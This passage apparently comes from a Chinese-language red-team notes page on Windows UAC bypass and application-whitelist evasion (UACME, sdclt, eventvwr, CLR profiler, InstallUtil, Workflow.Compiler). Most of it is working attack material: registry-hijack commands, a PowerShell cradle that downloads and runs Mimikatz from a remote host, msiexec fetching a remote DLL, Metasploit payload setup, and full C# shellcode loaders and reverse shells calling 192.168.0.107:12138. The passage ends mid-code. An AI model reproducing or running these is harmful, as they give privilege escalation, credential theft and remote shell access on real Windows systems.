<h4 id="Uacme"><a href="#Uacme" class="headerlink" title="Uacme"></a>Uacme</h4><pre><code>åŒ…æ‹¬DLLåŠ«æŒï¼ŒCOMåŠ«æŒç­‰50å¤šç§bypassæ–¹æ³•
https://github.com/hfiref0x/UACME
</code></pre>
<p><img src="./img/112.png" alt="image"></p>
<pre><code>ä½¿ç”¨visual studioç¼–è¯‘
Visual Studio 2013v120ï¼›
Visual Studio 2015v140ï¼›
Visual Studio 2017v141;
Visual Studio 2019v142ã€‚
ç›®å‰å…±59ç§bypassuacæ–¹å¼
æ‰§è¡Œæ–¹æ³•æ˜¯
&gt;akagi.exe 1
&gt;akagi.exe 1 c:\windows\system32\cmd.exe
&gt;akagi.exe 1 &quot;net user 1 1 /add&quot;
æ³¨æ„ï¼š
æ–¹å¼5ï¼Œ9ä¼šå¯¹ç›®æ ‡å®‰å…¨æ€§äº§ç”Ÿå½±å“ï¼Œè°¨æ…ä½¿ç”¨ï¼Œ5éœ€é‡å¯
æ–¹å¼6ä»win8å¼€å§‹åœ¨x64ä¸Šä¸å¯ç”¨
æ–¹å¼11ï¼Œ54åªæ”¯æŒx32 
æ–¹å¼13ï¼Œ19ï¼Œ30ï¼Œ50åªæ”¯æŒx64
æ–¹å¼14éœ€è¦è¿›ç¨‹æ³¨å…¥ï¼Œx64è¦ä½¿ç”¨x64çš„å·¥å…·
</code></pre>
<h4 id="Bypass-UAC-1"><a href="#Bypass-UAC-1" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h4><pre><code>https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
&gt;Bypass-UAC -Method UacMethodSysprep
</code></pre>
<p><img src="./img/113.png" alt="image"></p>
<pre><code>Method:
UacMethodSysprep
ucmDismMethod
UacMethodMMC2
UacMethodTcmsetup
UacMethodNetOle32
</code></pre>
<h4 id="DLL-hijack"><a href="#DLL-hijack" class="headerlink" title="DLL hijack"></a>DLL hijack</h4><pre><code>ç¨‹åºè¿è¡Œï¼Œè°ƒç”¨DLLçš„æµç¨‹
1.ç¨‹åºæ‰€åœ¨ç›®å½•
2.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•
3.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•
4.Windowsç›®å½•
5.åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰ç›®å½•
6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½•
ä½¿ç”¨
https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck
æ£€æŸ¥ä¸€ä¸ªç¨‹åºçš„æ˜¯å¦ä»¥é«˜æƒé™æ‰§è¡Œ
&gt;sigcheck.exe -m c:\1.exe
æŸ¥çœ‹autoElevateæ˜¯å¦ä¸ºtrue
</code></pre>
<p><img src="./img/114.png" alt="image"></p>
<pre><code>ä½¿ç”¨process monitoræŸ¥çœ‹å¯¹åº”ç¨‹åºæ‰§è¡Œæ—¶è°ƒç”¨çš„DLLæƒ…å†µï¼ŒæŸ¥æ‰¾DLLä¸åœ¨
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLsåˆ—è¡¨ä¸­ï¼Œå¹¶ä¸”æ‰€åœ¨æ–‡ä»¶å¤¹å½“å‰ç”¨æˆ·å¯è¯»å†™ï¼Œæ¥ä¸‹æ¥ç”Ÿæˆæ¶æ„dllå¤‡ä»½åŸDLLæ›¿æ¢ï¼Œå†è¿è¡Œæ­¤ç¨‹åºå³å¯åŠ«æŒæˆåŠŸã€‚
</code></pre>
<h4 id="SilentCleanup"><a href="#SilentCleanup" class="headerlink" title="SilentCleanup"></a>SilentCleanup</h4><pre><code>&gt;reg add hkcu\Environment /v windir /d &quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &quot;
&gt;schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
</code></pre>
<h4 id="Sdclt"><a href="#Sdclt" class="headerlink" title="Sdclt"></a>Sdclt</h4><pre><code>win10
</code></pre>
<h5 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h5><pre><code>&gt;reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /t REG_SZ /d %COMSPEC% /f è·å¾—ç®¡ç†å‘˜æƒé™
&gt;sdclt å¼¹å‡ºcmd
&gt;reg delete &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /f æ¸…é™¤ç—•è¿¹
</code></pre>
<h5 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h5><pre><code>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
&gt;Invoke-SDCLTBypass -Command &quot;c:\windows\system32\cmd.exe /c C:\Windows\regedit.exe&quot;
&gt;sdclt.exe /KickOffElev
</code></pre>
<h4 id="Makecab-amp-Wusa"><a href="#Makecab-amp-Wusa" class="headerlink" title="Makecab&amp;Wusa"></a>Makecab&amp;Wusa</h4><pre><code>å¤åˆ¶æ–‡ä»¶å‡ºé”™æ—¶
</code></pre>
<p><img src="./img/115.png" alt="image"></p>
<pre><code>&gt;makecab PsExec64.exe C:\Users\y.ZONE\Desktop\ps.cab
&gt;wusa C:\Users\y.ZONE\Desktop\ps.cab /extract:C:\Windows\system32\
</code></pre>
<p><img src="./img/116.png" alt="image"></p>
<h4 id="CLR-BypassUAC"><a href="#CLR-BypassUAC" class="headerlink" title="CLR BypassUAC"></a>CLR BypassUAC</h4><pre><code>Tested on win10 x64
ç”Ÿæˆdllä¼ å…¥å—æ§æœºtempç›®å½•ï¼Œä»¥ä¸‹ä¿å­˜ä¸º1.batæ‰§è¡Œã€‚
REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f
å—æ§æœºæ‰§è¡Œgpedit.mscæˆ–eventvwrç­‰é«˜æƒé™.netç¨‹åºæ—¶å¯åŠ«æŒæˆåŠŸã€‚
</code></pre>
<p><img src="./img/117.png" alt="image"></p>
<pre><code>æ‰§è¡Œå
</code></pre>
<p><img src="./img/118.png" alt="image"><br><img src="./img/119.png" alt="image"><br><img src="./img/120.png" alt="image"></p>
<h4 id="eventvwråŠ«æŒæ³¨å†Œè¡¨"><a href="#eventvwråŠ«æŒæ³¨å†Œè¡¨" class="headerlink" title="eventvwråŠ«æŒæ³¨å†Œè¡¨"></a>eventvwråŠ«æŒæ³¨å†Œè¡¨</h4><pre><code>æ‰“å¼€ProcessMonitorï¼Œå¯åŠ¨eventvwrï¼Œctrl+Tæ‰“å¼€è¿›ç¨‹æ ‘ï¼Œé€‰æ‹©è¿›ç¨‹è½¬åˆ°äº‹ä»¶
</code></pre>
<p><img src="./img/121.png" alt="image"></p>
<pre><code>å³é”®é€‰æ‹©åŒ…æ‹¬eventvwr.exe
</code></pre>
<p><img src="./img/122.png" alt="image"></p>
<pre><code>åªé€‰æ‹©æ˜¾ç¤ºæ³¨å†Œè¡¨æ´»åŠ¨
</code></pre>
<p><img src="./img/123.png" alt="image"></p>
<pre><code>æ·»åŠ ä¸€æ¡è¿‡æ»¤å™¨ï¼Œæ˜¾ç¤ºnot foundæ–‡ä»¶
</code></pre>
<p><img src="./img/124.png" alt="image"></p>
<pre><code>æ‰¾åˆ°ç›¸åº”çš„æ³¨å†Œè¡¨ä½ç½®
</code></pre>
<p><img src="./img/125.png" alt="image"><br><img src="./img/126.png" alt="image"></p>
<pre><code>å€¼ä¿®æ”¹ä¸º
</code></pre>
<p><img src="./img/127.png" alt="image"></p>
<pre><code>MSFç›‘å¬ï¼Œå†æ¬¡æ‰“å¼€eventvwr
</code></pre>
<p><img src="./img/128.png" alt="image"></p>
<h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a>Web Delivery</h4><pre><code>&gt;use exploit/multi/script/web_delivery
&gt;set target 3
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;exploit
&gt;use auxiliary/server/regsvr32_command_delivery_server
&gt;set cmd ipconfig
&gt;use exploit/windows/misc/regsvr32_applocker_bypass_server
</code></pre>
<h4 id="Invoke-PsUACme"><a href="#Invoke-PsUACme" class="headerlink" title="Invoke-PsUACme"></a>Invoke-PsUACme</h4><pre><code>method=&quot;sysprep&quot;,&quot;oobe&quot;,&quot;ActionQueue&quot;,&quot;migwiz&quot;,&quot;cliconfg&quot;,&quot;winsat&quot;,&quot;mmc&quot;
&gt;Invoke-PsUACme -method oobe -Payload &quot;c:\user\a\desktop\x.exe&quot;
éœ€æŒ‡å®šç»å¯¹è·¯å¾„
&gt;Invoke-PsUACme -method oobe -Payload &quot;powershell -w hidden -e xxxxxx&quot;
&gt;Invoke-PsUACme -Payload &quot;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot;
MSFVENOMç”Ÿæˆpsh-reflectionæ ¼å¼è„šæœ¬
&gt;Invoke-PsUACme â€“Payload &quot;powershell c:\1.ps1&quot;
</code></pre>
<h3 id="Whitelist-ç™½åå•"><a href="#Whitelist-ç™½åå•" class="headerlink" title="Whitelist(ç™½åå•)"></a>Whitelist(ç™½åå•)</h3><h4 id="GreatSCT-1"><a href="#GreatSCT-1" class="headerlink" title="GreatSCT"></a>GreatSCT</h4><pre><code>&gt;git clone https://github.com/GreatSCT/GreatSCT.git
&gt;cd GreatSCT/setup&amp;./setup.sh
&gt;use Bypass
&gt;list
&gt;use regasm/meterpreter/rev_tcp.py
&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
</code></pre>
<h4 id="JSRat"><a href="#JSRat" class="headerlink" title="JSRat"></a>JSRat</h4><pre><code>&gt;JSRat.py -i 192.168.1.107 -p 4444
</code></pre>
<h4 id="Odbcconf-exe"><a href="#Odbcconf-exe" class="headerlink" title="Odbcconf.exe"></a>Odbcconf.exe</h4><pre><code>&gt;odbcconf.exe /a &#123;regsvr C:\shell.dll&#125; å¯ä»¥æ˜¯ä»»æ„åç¼€
</code></pre>
<h4 id="Msiexec-exe"><a href="#Msiexec-exe" class="headerlink" title="Msiexec.exe"></a>Msiexec.exe</h4><pre><code>&gt;msiexec /y c:\user\admin\desktop\1.dll
&gt;msiexec /q /i http://192.168.0.107/dll.dll
</code></pre>
<h4 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\Users\y\Desktop\1.cs
using System;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Configuration.Install;
using System.Windows.Forms;
public class GQLBigHgUniLuVx &#123;
    public static void Main()
    &#123;
        while(true)
        &#123;&#123; MessageBox.Show("doge"); Console.ReadLine();&#125;&#125;
    &#125;
&#125;
[System.ComponentModel.RunInstaller(true)]
public class esxWUYUTWShqW : System.Configuration.Install.Installer
&#123;
    public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)
    &#123;
        jkmhGrfzsKQeCG.LCIUtRN();
    &#125;
&#125;
public class jkmhGrfzsKQeCG
&#123; [DllImport(&quot;kernel&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);
[DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);
[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);
static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) &#123;
IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);
Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try &#123; XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); &#125;
catch &#123; return null;&#125;
byte[] UmquAHRnhhpuE = new byte[4];
XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);
byte[] qaYyFq = new byte[kFVRSNnpj +5];
int SRCDELibA =0;
while(SRCDELibA &lt; kFVRSNnpj)
&#123; SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)&lt;4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);&#125;
byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;
return qaYyFq;&#125;
static void cmMtjerv(byte[] HEHUjJhkrNS) &#123;
if(HEHUjJhkrNS !=null) &#123;
UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);
Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);
IntPtr UhxtIFnlOQatrk = IntPtr.Zero;
UInt32 wdjYKFDCCf =0;
IntPtr XVYcQxpp = IntPtr.Zero;
UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);
WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); &#125;&#125;
public static void LCIUtRN() &#123;
byte[] IBtCWU =null; IBtCWU = ErlgHH(&quot;192.168.0.107&quot;,12138);
cmMtjerv(IBtCWU);
&#125; &#125;
ç”Ÿæˆexeåæ‰§è¡Œ
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\y.exe
MSFç›‘å¬12138ç«¯å£
</code></pre>
<h4 id="Compiler-exe"><a href="#Compiler-exe" class="headerlink" title="Compiler.exe"></a>Compiler.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp
</code></pre>
<p><img src="./img/129.png" alt="image"></p>
<h5 id="1-xml"><a href="#1-xml" class="headerlink" title="1.xml"></a>1.xml</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;&gt;
&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;
&lt;d2p1:string&gt;1.tcp&lt;/d2p1:string&gt;
&lt;/files&gt;
&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;&gt;
&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/coreAssemblyFileName&gt;
&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;
&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;
&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;
&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/outputName&gt;
&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;
&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;-1&lt;/warningLevel&gt;
&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;
&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;
&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;
&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;
&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;
&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;
&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;
&lt;d2p1:mtInfo i:nil=&quot;true&quot;/&gt;
&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;
&lt;/parameters&gt;
&lt;/CompilerInput&gt;
</code></pre>
<h5 id="1-tcp"><a href="#1-tcp" class="headerlink" title="1.tcp"></a>1.tcp</h5><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>ComponentModel</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities</span><span class="token punctuation">;</span> 
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">SequentialWorkflowActivity</span></span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">static</span> <span class="token class-name">StreamWriter</span> streamWriter<span class="token punctuation">;</span> 
<span class="token keyword">public</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">TcpClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TcpClient</span><span class="token punctuation">(</span><span class="token string">"192.168.0.107"</span><span class="token punctuation">,</span> <span class="token number">12138</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">Stream</span> stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">StreamReader</span> rdr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
streamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token class-name">StringBuilder</span> strInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>
strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sendingProcess<span class="token punctuation">,</span> <span class="token class-name">DataReceivedEventArgs</span> outLine<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token class-name">StringBuilder</span> strOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">try</span>
<span class="token punctuation">&#123;</span>
strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>
streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.cs
</code></pre>
<p><img src="./img/130.png" alt="image"></p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span> 
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Threading</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">yrDaTlg</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">SequentialWorkflowActivity</span></span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> rCfMkmxRSAakg<span class="token punctuation">,</span><span class="token class-name">UInt32</span> qjRsrljIMB<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> peXiTuE<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> AkpADfOOAVBZ<span class="token punctuation">)</span><span class="token punctuation">;</span>
